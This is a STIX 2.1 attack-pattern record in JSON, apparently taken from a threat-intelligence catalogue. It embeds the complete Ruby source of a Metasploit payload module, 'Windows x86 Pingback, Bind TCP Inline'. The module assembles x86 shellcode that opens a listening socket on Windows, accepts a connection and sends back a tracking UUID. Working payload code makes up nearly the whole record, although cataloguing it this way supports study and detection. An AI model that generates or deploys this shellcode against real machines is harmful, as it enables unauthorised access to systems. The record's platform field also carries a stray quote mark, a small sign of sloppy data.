{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--095a3818-0024-47ce-b339-7b7407f6f931",
    "created": "2024-08-14T16:33:19.379854Z",
    "modified": "2024-08-14T16:33:19.379858Z",
    "name": "Windows x86 Pingback, Bind TCP Inline",
    "description": "Open a socket and report UUID when a connection is received (Windows x86)",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/windows/pingback_bind_tcp.rb",
            "external_id": "pingback_bind_tcp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = 314\n\n  include Msf::Payload::Windows\n  include Msf::Payload::Single\n  include Msf::Payload::Pingback\n  include Msf::Payload::Windows::BlockApi\n  include Msf::Payload::Pingback::Options\n  include Msf::Payload::Windows::Exitfunk\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'Windows x86 Pingback, Bind TCP Inline',\n      'Description'   => 'Open a socket and report UUID when a connection is received (Windows x86)',\n      'Author'        => [ 'bwatters-r7' ],\n      'License'       => MSF_LICENSE,\n      'Platform'      => 'win',\n      'Arch'          => ARCH_X86,\n      'Handler'       => Msf::Handler::BindTcp,\n      'Session'       => Msf::Sessions::Pingback\n    ))\n\n    def required_space\n      # Start with our cached default generated size\n      space = cached_size\n\n      # EXITFUNK 'seh' is the worst case, that adds 15 bytes\n      space += 15\n\n      space\n    end\n\n    def generate(_opts = {})\n      encoded_port = [datastore['LPORT'].to_i,2].pack(\"vn\").unpack(\"N\").first\n      encoded_host = Rex::Socket.addr_aton(datastore['LHOST']||\"127.127.127.127\").unpack(\"V\").first\n      encoded_host_port = \"0x%.8x%.8x\" % [encoded_host, encoded_port]\n      self.pingback_uuid ||= self.generate_pingback_uuid\n      uuid_as_db = \"0x\" + self.pingback_uuid.chars.each_slice(2).map(&:join).join(\",0x\")\n      conf = { exitfunk: datastore['EXITFUNC'] }\n      addr_fam      = 2\n      sockaddr_size = 16\n\n      asm = %Q^\n        cld                    ; Clear the direction flag.\n        call start             ; Call start, this pushes the address of 'api_call' onto the stack.\n        #{asm_block_api}\n        start:\n          pop ebp\n      ; Input: EBP must be the address of 'api_call'.\n      ; Output: EDI will be the newly connected clients socket\n      ; Clobbers: EAX, ESI, EDI, ESP will also be modified (-0x1A0)\n\n      bind_tcp:\n        push 0x00003233        ; Push the bytes 'ws2_32',0,0 onto the stack.\n        push 0x5F327377        ; ...\n        push esp               ; Push a pointer to the \"ws2_32\" string on the stack.\n        push #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}\n        call ebp               ; LoadLibraryA( \"ws2_32\" )\n\n        mov eax, 0x0190        ; EAX = sizeof( struct WSAData )\n        sub esp, eax           ; alloc some space for the WSAData structure\n        push esp               ; push a pointer to this stuct\n        push eax               ; push the wVersionRequested parameter\n        push #{Rex::Text.block_api_hash('ws2_32.dll', 'WSAStartup')}\n        call ebp               ; WSAStartup( 0x0190, &WSAData );\n\n        push 11\n        pop ecx\n      push_0_loop:\n        push eax               ; if we succeed, eax will be zero, push it enough times\n                               ; to cater for both IPv4 and IPv6\n        loop push_0_loop\n\n                               ; push zero for the flags param [8]\n                               ; push null for reserved parameter [7]\n                               ; we do not specify a WSAPROTOCOL_INFO structure [6]\n                               ; we do not specify a protocol [5]\n        push 1                 ; push SOCK_STREAM\n        push #{addr_fam}       ; push AF_INET/6\n        push #{Rex::Text.block_api_hash('ws2_32.dll', 'WSASocketA')}\n        call ebp               ; WSASocketA( AF_INET/6, SOCK_STREAM, 0, 0, 0, 0 );\n        xchg edi, eax          ; save the socket for later, don't care about the value of eax after this\n\n                               ; bind to 0.0.0.0/[::], pushed earlier\n\n        push #{encoded_port}   ; family AF_INET and port number\n        mov esi, esp           ; save a pointer to sockaddr_in struct\n        push #{sockaddr_size}  ; length of the sockaddr_in struct (we only set the first 8 bytes, the rest aren't used)\n        push esi               ; pointer to the sockaddr_in struct\n        push edi               ; socket\n        push #{Rex::Text.block_api_hash('ws2_32.dll', 'bind')}\n        call ebp               ; bind( s, &sockaddr_in, 16 );\n        test eax,eax            ; non-zero means a failure\n        jnz failure\n                               ; backlog, pushed earlier [3]\n        push edi               ; socket\n        push #{Rex::Text.block_api_hash('ws2_32.dll', 'listen')}\n        call ebp               ; listen( s, 0 );\n\n                               ; we set length for the sockaddr struct to zero, pushed earlier [2]\n                               ; we dont set the optional sockaddr param, pushed earlier [1]\n        push edi               ; listening socket\n        push #{Rex::Text.block_api_hash('ws2_32.dll', 'accept')}\n        call ebp               ; accept( s, 0, 0 );\n\n        push edi               ; push the listening socket\n        xchg edi, eax          ; replace the listening socket with the new connected socket for further comms\n        push #{Rex::Text.block_api_hash('ws2_32.dll', 'closesocket')}\n        call ebp               ; closesocket( s );\n\n        send_pingback:\n          push 0                 ; flags\n          push #{uuid_as_db.split(\",\").length} ; length of the PINGBACK UUID\n          call get_pingback_address  ; put pingback_uuid buffer on the stack\n          db #{uuid_as_db}  ; PINGBACK_UUID\n        get_pingback_address:\n          push edi               ; saved socket\n          push #{Rex::Text.block_api_hash('ws2_32.dll', 'send')}\n          call ebp               ; call send\n\n        push edi               ; push the listening socket\n        xchg edi, eax          ; replace the listening socket with the new connected socket for further comms\n        push #{Rex::Text.block_api_hash('ws2_32.dll', 'closesocket')}\n        call ebp               ; closesocket( s );\n\n        handle_connect_failure:\n          ; decrement our attempt count and try again\n          dec dword [esi+8]\n          jnz failure\n\n        cleanup_socket:\n          ; clear up the socket\n          push edi                ; socket handle\n          push #{Rex::Text.block_api_hash('ws2_32.dll', 'closesocket')}\n          call ebp                ; closesocket(socket)\n\n        failure:\n      ^\n      if conf[:exitfunk]\n        asm << asm_exitfunk(conf)\n      end\n      Metasm::Shellcode.assemble(Metasm::X86.new, asm).encode_string\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "win'"
    ]
}